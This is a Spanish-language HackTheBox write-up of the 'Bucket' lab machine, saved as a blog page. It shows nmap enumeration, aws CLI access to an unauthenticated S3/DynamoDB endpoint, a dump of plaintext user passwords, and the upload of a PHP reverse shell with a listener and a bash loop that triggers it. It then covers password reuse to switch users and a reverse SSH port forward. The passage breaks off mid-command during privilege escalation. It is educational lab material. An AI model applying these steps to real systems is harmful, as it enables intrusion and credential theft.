@@ -1,0 +1,1445 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Bucket</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Bucket | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Bucket" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Linux nivel medio, jugaremos mucho con AWS, leeremos código fuente y descubriremos que podemos leer archivos como root. Esto mediante el juego entre la herramienta PD4ML y AWS DynamoDB." />
+<meta property="og:description" content="Máquina Linux nivel medio, jugaremos mucho con AWS, leeremos código fuente y descubriremos que podemos leer archivos como root. Esto mediante el juego entre la herramienta PD4ML y AWS DynamoDB." />
+<link rel="canonical" href="http://localhost:4000/htb/bucket" />
+<meta property="og:url" content="http://localhost:4000/htb/bucket" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-04-23T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283banner.png" />
+<meta property="twitter:title" content="HackTheBox - Bucket" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-04-23T00:00:00-07:00","datePublished":"2021-04-23T00:00:00-07:00","description":"Máquina Linux nivel medio, jugaremos mucho con AWS, leeremos código fuente y descubriremos que podemos leer archivos como root. Esto mediante el juego entre la herramienta PD4ML y AWS DynamoDB.","headline":"HackTheBox - Bucket","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/bucket"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/bucket"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Bucket</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-04-23">23 Apr 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283banner.png" alt="HackTheBox - Bucket">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Linux nivel medio, jugaremos mucho con <strong>AWS</strong>, leeremos código fuente y descubriremos que podemos leer archivos como root. Esto mediante el juego entre la herramienta <strong>PD4ML</strong> y <strong>AWS DynamoDB</strong>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283bucketHTB.png" alt="283bucketHTB" /></p>
+
+<h3 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h3>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/13531">MrR3boot</a>.</p>
+
+<p>Bueno bueno, nos estrellaremos contra el servicio <code>AWS S3</code>, que nos permite (entre otras cosas) mediante <strong>buckets</strong> almacenar información en las nubes :P Tendremos que jugar con su <code>API</code> para obtener información de como subir un archivo al <code>bucket</code>… Después de muchas vueltas lograremos subir un archivo que nos permite obtener una reverse Shell, siendo rápidos lograremos la sesión como el usuario <code>www-data</code>.</p>
+
+<p>En la enumeración previa, obtuvimos otro servicio corriendo mediante <code>AWS</code>, en este caso el motor de base de datos NoSQL <code>DynamoDB</code>. Jugando también con la <code>API</code> obtendremos la base de datos <code>users</code> y varias credenciales… Estando dentro de la máquina veremos al usuario <code>roy</code>, usando las credenciales encontradas lograremos migrarnos a su sesión.</p>
+
+<p>Finalmente nos encontraremos un archivo <code>index.php</code> algo curioso, nos fijaremos en su cabecera y tendremos un proceso que involucra <code>DynamoDB</code> y <code>PD4ML</code> (básicamente convierte un archivo en otro con formato <code>.PDF</code>). En el código llama una tabla (que no existe) y guarda su data en un objeto que posteriormente lo convierte en <code>PDF</code>. Todo esto ejecutado como usuario administrador del sistema (root). Así que aprovecharemos esta locura para obtener la llave privada (id_rsa) del usuario <code>root</code> e ingresar a la máquina.</p>
+
+<h4 id="clasificación-de-la-máquina">Clasificación de la máquina</h4>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 90%;" /></p>
+
+<p>Jmmm, no son vulnerabilidades conocidas, pero pueden llegar a ser reales, pero claro, debemos mover algunas tuercas para que funcione.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo plasmar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p><strong>Fases</strong> 🙄</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a>.</li>
+  <li><a href="#explotacion">Explotación</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.</li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Empezamos realizando un escaneo de puertos sobre la máquina para conocer que servicios esta corriendo.</p>
+
+<pre><code class="language-bash">–» nmap -p- --open -v 10.10.10.212 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/Writeups/master/HTB/Magic/images/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">–» cat initScan 
+# Nmap 7.80 scan initiated Wed Dec 23 25:25:25 2020 as: nmap -p- --open -v -oG initScan 10.10.10.212
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.212 ()   Status: Up
+Host: 10.10.10.212 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
+# Nmap done at Wed Dec 23 25:25:25 2020 -- 1 IP address (1 host up) scanned in 95.68 seconds
+</code></pre>
+
+<p>Muy bien, ¿que tenemos?</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left"><strong><a href="https://es.wikipedia.org/wiki/Secure_Shell">SSH</a></strong>: Conexion remota segura mediante una shell.</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left"><strong><a href="https://developer.mozilla.org/es/docs/Web/HTTP/Overview">HTTP</a></strong>: Comunicación que permite las transferencias de información a través de archivos en internet.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Realizemos un escaneo en base a scripts y versiones sobre cada puerto, con ello obtenemos informacion mas detallada de cada servicio:</p>
+
+<pre><code class="language-bash">–» nmap -p 22,80 -sC -sV 10.10.10.212 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">–» cat portScan 
+# Nmap 7.80 scan initiated Wed Dec 23 25:25:25 2020 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.212
+Nmap scan report for 10.10.10.212
+Host is up (0.19s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Did not follow redirect to http://bucket.htb/
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Dec 23 25:25:25 2020 -- 1 IP address (1 host up) scanned in 22.35 seconds
+</code></pre>
+
+<p>Tenemos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">22</td>
+      <td style="text-align: left">SSH</td>
+      <td style="text-align: left">OpenSSH 8.2p1 Ubuntu 4</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left">Apache httpd 2.4.41</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>…</p>
+
+<h3 id="puerto-80">Puerto 80 <a href="#puerto-80">⌖</a></h3>
+
+<p>Añadimos el dominio <code>bucket.htb</code> a nuestro <code>/etc/hosts</code>. Por dos razones, en el reporte de <code>nmap</code> intenta hacer un redireccionamiento hacia ese dominio y si colocamos la IP en la web nos da error :P</p>
+
+<blockquote>
+  <p>Sobre el archivo <code>/etc/hosts</code>, en simples palabras sirve para relacionar/resolver los nombres de dominio con determinadas direcciones IP.</p>
+</blockquote>
+
+<ul>
+  <li><a href="http://e-logicasoftware.com/tutoriales/tutoriales/linuxcurso/base/linux065.html">Data sobre el archivo <strong>/etc/hosts</strong></a>.</li>
+</ul>
+
+<pre><code class="language-bash">–» cat /etc/hosts
+...
+10.10.10.212  bucket.htb
+...
+</code></pre>
+
+<p>Tenemos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_bucketHTB.png" alt="283page_bucketHTB" /></p>
+
+<p>Nada en que fijarnos, revisando el código fuente obtenemos otro dominio:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_bucketHTB_sourcecode.png" alt="283page_bucketHTB_sourcecode" /></p>
+
+<ul>
+  <li><code>s3.bucket.htb</code>, agreguémoslo también al <code>/etc/hosts</code>.</li>
+</ul>
+
+<pre><code class="language-bash">–» cat /etc/hosts
+...
+10.10.10.212  bucket.htb s3.bucket.htb
+...
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_s3bucketHTB.png" alt="283page_s3bucketHTB" /></p>
+
+<p>Lo único que obtenemos es eso. Por lo que entiendo (según la ruta que vimos en el código fuente: <code>s3.bucket.htb/adserver</code>) estamos viendo el estado de un servidor de Ads (publicidad o anuncios). Por ahora no tenemos más, intentemos hacer fuzzing sobre las dos webs a ver si encontramos algo (:</p>
+
+<p>El dominio <code>s3.bucket.htb</code> nos da la siguiente respuesta:</p>
+
+<pre><code class="language-bash">–» dirsearch.py -u http://s3.bucket.htb/ -q
+200 -    2B  - http://s3.bucket.htb/%2e%2e;/test
+200 -    2B  - http://s3.bucket.htb/+CSCOE+/logon.html#form_title_text
+200 -    2B  - http://s3.bucket.htb/+CSCOT+/oem-customization?app=AnyConnect&amp;type=oem&amp;platform=..&amp;resource-type=..&amp;name=%2bCSCOE%2b/portal_inc.lua
+200 -    2B  - http://s3.bucket.htb/+CSCOE+/session_password.html
+200 -    2B  - http://s3.bucket.htb/+CSCOT+/translation-table?type=mst&amp;textdomain=/%2bCSCOE%2b/portal_inc.lua&amp;default-language&amp;lang=../
+200 -   54B  - http://s3.bucket.htb/health
+500 -  290B  - http://s3.bucket.htb/latest/meta-data/hostname
+403 -  278B  - http://s3.bucket.htb/server-status
+200 -    0B  - http://s3.bucket.htb/shell
+500 -  158B  - http://s3.bucket.htb/shell.php
+500 -  158B  - http://s3.bucket.htb/shell.aspx
+500 -  158B  - http://s3.bucket.htb/shell.html
+500 -  158B  - http://s3.bucket.htb/shell.jsp
+500 -  158B  - http://s3.bucket.htb/shell.js
+500 -  158B  - http://s3.bucket.htb/shell.sh
+500 -  158B  - http://s3.bucket.htb/shellz.php
+500 -  158B  - http://s3.bucket.htb/shell.asp
+500 -  158B  - http://s3.bucket.htb/shell.htm
+</code></pre>
+
+<p>Si revisamos <code>shell</code>, nos redirecciona a lo que parece ser un contenedor:</p>
+
+<pre><code class="language-html">http://s3.bucket.htb/shell -&gt; (redirecciona a) -&gt; http://444af250749d:4566/shell/
+</code></pre>
+
+<p>Los demás no nos muestran nada relevante…</p>
+
+<p>La curiosidad me llevo a buscar <code>s3</code> en la web, la respuesta: <code>Amazon S3</code>. Resumiendo: Almacenamiento de datos seguros en la web mediante <code>Buckets</code> «nombre de la máquina (?)».</p>
+
+<blockquote>
+  <p>Amazon S3 es un servicio ampliamente usado por compañias para guardar mediante <code>buckets</code> imagenes, estadisticas, recursos y cualquier objeto que pueda ayudar o necesitar la parte logica del negocio.</p>
+</blockquote>
+
+<ul>
+  <li>Más info <a href="https://aws.amazon.com/es/s3/">acá</a> y <a href="https://docs.aws.amazon.com/es_es/AmazonS3/latest/dev/Welcome.html">acá</a> :P</li>
+</ul>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<p>Listos, leyendo sabemos que podemos subir archivos al <code>bucket</code>, siguiendo la <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html">guía oficial</a> logramos instalar <code>aws cli</code>, nos apoyaremos de él para jugar con todo el entorno.</p>
+
+<p>Sabemos que podemos subir, borrar, actualizar y borrar objetos sobre el <code>bucket</code>. Por ejemplo para listar los objetos del <code>bucket</code> haríamos algo así:</p>
+
+<ul>
+  <li>S3 Bucket Misconfigured Access Controls - <a href="https://medium.com/bugbountywriteup/s3-bucket-misconfigured-access-controls-to-critical-vulnerability-6b535e3df9a5">Medium.com/BugBountyWriteup</a>.</li>
+</ul>
+
+<pre><code class="language-bash">–» aws s3 ls s3://s3.bucket.htb/
+</code></pre>
+
+<p>(Nos pide que agreguemos unas credenciales válidas :P, busque pero no encontré, así que puse cualquiera :P)</p>
+
+<p>Pero si recordamos la URL con la que llegamos acá fue <code>http://s3.bucket.htb/adserver/images/</code> y ya sabiendo que estamos manejando <code>buckets</code>, lo más seguro es que <code>adserver</code> sea uno de ellos.</p>
+
+<pre><code class="language-bash">–» aws s3 ls s3://s3.bucket.htb/adserver/images/
+
+An error occurred (InvalidAccessKeyId) when calling the ListObjectsV2 operation: The AWS Access Key Id you provided does not exist in our records.
+</code></pre>
+
+<p>El tema es que obtenemos un error con respecto al <code>AccessKeyId</code> ): Acá estuve full perdido, buscando y buscando, al límite del desespero :P pero sin resignarme encontré mi salvación:</p>
+
+<ul>
+  <li>Working with localstack CLI - <a href="https://lobster1234.github.io/2017/04/05/working-with-localstack-command-line/">lobster1234/github.io</a>.</li>
+</ul>
+
+<pre><code class="language-bash">–» aws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver/images/
+2020-12-25 19:24:04      37840 bug.jpg
+2020-12-25 19:24:04      51485 cloud.png
+2020-12-25 19:24:04      16486 malware.png
+</code></pre>
+
+<p>Perfectoooooooooooooooooooooooo, intentemos subir un archivo:</p>
+
+<pre><code class="language-bash">–» cat upupup.txt 
+hola padreeeeeeeeeeeeeeee!!
+· ~/sec/htb/bucket/content ·
+–» aws --endpoint-url=http://s3.bucket.htb s3 cp upupup.txt s3://adserver/images/
+upload: ./upupup.txt to s3://adserver/images/upupup.txt          
+· ~/sec/htb/bucket/content ·
+–» aws --endpoint-url=http://s3.bucket.htb s3 ls s3://adserver/images/
+2020-12-25 19:30:03      37840 bug.jpg
+2020-12-25 19:30:03      51485 cloud.png
+2020-12-25 19:30:03      16486 malware.png
+2020-12-25 19:31:01         28 upupup.txt
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_s3bucketHTB_upupup.png" alt="283page_s3bucketHTB_upupup" /></p>
+
+<p>Listos, el tema es que hay un limpiado de archivos super agresivo, lo cual nos da poco tiempo para revisar todo… Intentando subir una reverse Shell o webshell no obtuve éxito, lo único que me da respuesta es usar <code>JavaScript</code>, pero tampoco logre hacer mucho (o pues nada hasta el momento 😒).</p>
+
+<p>Retrocediendo un poco sobre la ruta <code>/health</code> nos dice que tenemos <code>s3</code> y <code>dynamodb</code> corriendo (va tomando sentido lo que vamos encontrando):</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_s3bucketHTB_health.png" alt="283page_s3bucketHTB_health" /></p>
+
+<p>Si leemos la documentación de <code>aws</code> también tiene la opción de usar <code>dynamodb</code>, que nos permite crear tablas, listar las actuales, agregar ítems, entre otras cosas.</p>
+
+<ul>
+  <li>CLI Services DynamoDB - <a href="https://docs.aws.amazon.com/es_es/cli/latest/userguide/cli-services-dynamodb.html">docs.aws/userguide</a>.</li>
+  <li>CLI dynamodb - <a href="https://docs.aws.amazon.com/cli/latest/reference/dynamodb/index.html">docs.aws/reference</a>.</li>
+</ul>
+
+<blockquote>
+  <p><code>DynamoDB</code> es una base de datos no relacional que ofrece rendimiento en milisegundos, es ofrecido por Amazon Web Services… <a href="https://www.freecodecamp.org/news/ultimate-dynamodb-2020-cheatsheet/#the-basics-of-dynamodb">freecodecamp.org/basics-dynamodb</a></p>
+</blockquote>
+
+<p>Probemos a listar las tablas que existan:</p>
+
+<pre><code class="language-bash">–» aws --endpoint-url=http://s3.bucket.htb dynamodb list-tables
+TABLENAMES      Image
+TABLENAMES      ImageTag
+TABLENAMES      users
+</code></pre>
+
+<p>Okaaaaaa, claramente nos llama la atención la tabla <code>users</code>, usando el <a href="https://docs.aws.amazon.com/cli/latest/reference/dynamodb/scan.html">parámetro <code>scan</code></a> podemos ver su contenido:</p>
+
+<pre><code class="language-bash">–» aws --endpoint-url=http://s3.bucket.htb dynamodb scan --table-name users
+None    3       3
+PASSWORD        Management@#1@#
+USERNAME        Mgmt
+PASSWORD        Welcome123!
+USERNAME        Cloudadm
+PASSWORD        n2vM-&lt;_K_Q:.Aa2
+USERNAME        Sysadm
+</code></pre>
+
+<p>Obtenemos unas credenciales, probablemente para migrar de usuarios estando dentro de la maquina. Por ahora los guardamos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Username</th>
+      <th style="text-align: left">Password</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">Mgmt</td>
+      <td style="text-align: left">Management@#1@#</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Cloudadm</td>
+      <td style="text-align: left">Welcome123!</td>
+    </tr>
+    <tr>
+      <td style="text-align: left">Sysadm</td>
+      <td style="text-align: left">n2vM-&lt;_K_Q:.Aa2</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Acá (como casi siempre) estuve full perdido ): Ya que nuestro objetivo inicial es subir un archivo que nos genere una reverse Shell, pero no entendía como debía ser el proceso, así que preferí buscar ayuda. <a href="https://www.hackthebox.eu/profile/49335">@TazWake</a> me redirecciono y a la vez me enseño a pensar fuera de la caja (como le dice la gente):</p>
+
+<p>El tema es que la subida del archivo está perfecto, en nuestro caso subiremos el famoso <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse Shell de monkeypentest</a> para que apenas lo ejecutemos obtengamos la Shell. Peeeeero acá es donde toca “testear” o “pensar fuera de la caja”, ya que si tenemos un servidor principal (<code>http://bucket.htb/</code>) y otro donde está el bucket (<code>http://s3.bucket.htb/adserver/</code>) podríamos probar a subir el archivo y revisar el servidor por si también de alguna forma se está guardando por ahí.</p>
+
+<p>Así que si inicialmente subimos el archivo <code>ejejerev.php</code>, ya con nuestra IP y PUERTO modificado:</p>
+
+<pre><code class="language-bash">–» aws --endpoint-url=http://s3.bucket.htb s3 cp ejejerev.php s3://adserver/images/
+upload: ./ejejerev.php to s3://adserver/images/ejejerev.php
+</code></pre>
+
+<p>Nos ponemos en escucha, en mi caso por el puerto <code>4433</code>:</p>
+
+<pre><code class="language-bash">–» nc -nlvp 4433
+listening on [any] 4433 ...
+</code></pre>
+
+<p>Probamos desde consola hacer una petición hacia el archivo:</p>
+
+<pre><code class="language-bash">–» curl -s http://s3.bucket.htb/adserver/images/ejejerev.php
+&lt;?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+...
+</code></pre>
+
+<p>Claramente no es ejecutado… Pero ¿Y si probamos con el servidor principal?</p>
+
+<pre><code class="language-bash">–» curl -s http://bucket.htb/adserver/images/ejejerev.php
+&lt;!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.41 (Ubuntu) Server at bucket.htb Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+</code></pre>
+
+<p>Y con solo la carpeta <code>/images/</code>?</p>
+
+<pre><code class="language-bash">–» curl -s http://bucket.htb/images/ejejerev.php
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283bash_bucketHTB_revsh.png" alt="283bash_bucketHTB_revsh" /></p>
+
+<p>Opa, intentamos un par de veces yyyyyyyy va pa i, obtenemos la Shell. Lección aprendida, probar cosas que parezcan extrañas. Entiendo que de alguna manera (quizás en algún documento que no encontré se explica o se menciona “”) temporalmente el servidor principal recoge lo que se está subiendo en el bucket para procesarlo o para… Jmm, no sabría para qué realmente ):</p>
+
+<p>Lo mejor es hacer un script para evitar que se nos borren los archivos y no alcanzar a ejecutarlos (lo más probable es que debamos ejecutarlo más de 1 vez):</p>
+
+<pre><code class="language-bash">#!/bin/bash
+
+file_to_up=$1
+
+echo -e "\n[+] Uploading $file_to_up\n"
+aws --endpoint-url=http://s3.bucket.htb/ s3 cp $file_to_up s3://adserver/images/
+
+echo -e "\n[+] Executing reverse shell.\n"
+sleep 3
+
+for i in {1..10}; do
+  curl -s -m 2 http://bucket.htb/images/$file_to_up &gt; /dev/null
+  sleep 1
+done
+</code></pre>
+
+<p>Bueno bueno, hagamos un <a href="https://www.youtube.com/watch?v=GVjNI-cPG6M&amp;t=1689">tratamiento de la TTY</a> apoyandonos de <code>S4vitar</code>.</p>
+
+<pre><code class="language-bash">www-data@bucket:/$ ls /home/
+roy
+www-data@bucket:/$ cat /home/roy/user.txt 
+cat: /home/roy/user.txt: Permission denied
+www-data@bucket:/$ 
+</code></pre>
+
+<p>Probemos migrarnos a <code>roy</code> con las contraseñas que encontramos anteriormente:</p>
+
+<ul>
+  <li>Con la contraseña de: <code>Sysadm - n2vM-&lt;_K_Q:.Aa2</code>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283bash_bHTB_revsh_su_roy.png" alt="283bash_bHTB_revsh_su_roy" /></p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Ahora si a enumerar.</p>
+
+<pre><code class="language-bash">roy@bucket:~$ netstat -l
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 localhost:8000          0.0.0.0:*               LISTEN
+tcp        0      0 localhost:33447         0.0.0.0:*               LISTEN
+tcp        0      0 localhost:domain        0.0.0.0:*               LISTEN
+tcp        0      0 localhost:4566          0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:ssh             0.0.0.0:*               LISTEN
+...
+</code></pre>
+
+<p>Haciendo <code>Port Forwarding</code> encontramos algo interesante en el puerto <code>8000</code>:</p>
+
+<pre><code class="language-bash">roy@bucket:~$ ssh -R 8000:localhost:8000 root@10.10.14.218
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/bucket/283page_RPF_8000.png" alt="283page_RPF_8000" /></p>
+
+<p>Si enumeramos, encontramos el codigo fuente de esa pagina:</p>
+
+<pre><code class="language-bash">roy@bucket:~$ cd
+roy@bucket:~$ cd /var/www/bucket-app/
+roy@bucket:/var/www/bucket-app$ ls -la 
+total 856
+drwxr-x---+  4 root root   4096 Sep 23 10:56 .
+drwxr-xr-x   4 root root   4096 Sep 21 12:28 ..
+-rw-r-x---+  1 root root     63 Sep 23 02:23 composer.json
+-rw-r-x---+  1 root root  20533 Sep 23 02:23 composer.lock
+drwxr-x---+  2 root root   4096 Jan  4 08:00 files
+-rwxr-x---+  1 root root  17222 Sep 23 03:32 index.php
+-rwxr-x---+  1 root root 808729 Jun 10  2020 pd4ml_demo.jar
+drwxr-x---+ 10 root root   4096 Sep 23 02:23 vendor
+roy@bucket:/var/www/bucket-app$ cat index.php | grep -i site -A 5
+    &lt;h1 class="advice__title"&gt;Site under construction or maintenance &lt;/h1&gt;
+    &lt;p class="advice__description"&gt;&lt;span&gt;&lt;&lt;/span&gt; Bucket Application &lt;span&gt;/&gt;&lt;/span&gt; not finished yet&lt;/p&gt;
+  &lt;/section&gt;
+  &lt;section class="city-stuff"&gt;
+    &lt;ul class="skyscrappers__list"&gt;
+      &lt;li class="skyscrapper__item skyscrapper-1"&gt;&lt;/li&gt;
+roy@bucket:/var/www/bucket-app$ 
+</code></pre>
+
+<p>Tenemos la estructura de la pagina y además que su propietario es el usuario <code>root</code>. Revisando el archivo <code>index.php</code> tenemos en su cabecera:</p>
+
+<pre><code class="language-php">roy@bucket:/var/www/bucket-app$ cat index.php | head -n 29
